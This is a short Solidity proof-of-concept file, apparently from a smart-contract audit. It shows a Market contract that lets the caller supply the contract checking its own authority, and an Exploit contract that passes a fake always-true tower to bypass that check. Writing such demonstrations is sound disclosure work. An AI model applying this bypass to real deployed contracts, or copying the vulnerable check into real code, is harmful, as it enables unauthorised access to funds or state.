// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IControlTower { function isPositionMigrator(address) external view returns(bool); }
contract FakeControlTower is IControlTower { function isPositionMigrator(address) external pure returns(bool){return true;} }
contract Market { bool public migrated; function migrateFrom(IControlTower tower) external { require(tower.isPositionMigrator(msg.sender),"not migrator"); migrated=true; } }
contract Exploit { bool public harmed; event Proof(bool migrated);
    function run() external { Market m=new Market(); FakeControlTower fake=new FakeControlTower();
        // @> _verifySenderMigrator(_controlTower) checks the caller-supplied, untrusted tower
        m.migrateFrom(fake); harmed=m.migrated(); emit Proof(harmed); require(harmed,"tower validated"); }
}
